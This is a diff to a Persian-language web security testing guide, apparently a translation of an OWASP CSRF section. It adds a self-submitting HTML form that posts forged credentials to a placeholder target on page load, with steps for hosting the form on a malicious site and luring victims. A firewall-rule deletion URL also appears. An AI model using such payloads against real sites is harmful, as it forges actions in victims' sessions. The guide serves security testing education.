@@ -128,7 +128,20 @@ https://www.company.example/fwmgt/delete?rule=*
 * یک صفحه HTML مشابه با آنچه در زیر نشان‌داده شده‌است ایجاد کنید.
 * موارد HTML را بر روی یک سایت شخص ثالث یا مخرب قرار دهید.
 * لینک صفحه را به قربانی (‏ها) ‏ارسال کنید و آن‌ها را وادار کنید که بر روی آن کلیک کنند.
+```html
 
+<html>
+<body onload='document.CSRF.submit()'>
+    
+<form action='http://targetwebsite/Authenticate.jsp' method='POST' name='CSRF'> 
+    <input type='hidden' name='name' value='Hacked'>
+    <input type='hidden' name='password' value='Hacked'>
+</form>
+    
+</body>
+</html>
+```
+    
 در مورد برنامه‌های کاربردی وب که در آن توسعه دهندگان از JSON برای ارتباط سرور استفاده می‌کنند، یک مشکل ممکن است با این واقعیت ایجاد شود که هیچ پارامتر پرسوجو با فرمت JSON وجود ندارد، که یک ضرورت با فرم‌های self-submitting است. برای دور زدن این مورد، ما می‌توانیم از یک فرم خود ارسال یا self-submitting با پیلود‌های JSON شامل ورودی‌های پنهان برای بهره‌برداری از CSRF استفاده کنیم. ما باید نوع رمزگذاری (enctype) را به text/plain تغییر دهیم تا اطمینان حاصل کنیم که پیلود به صورت as-is تحویل داده می‌شود. کد اکسپلویت شبیه به موارد زیر خواهد بود:
 
 درخواست POST به شرح زیر خواهد بود:
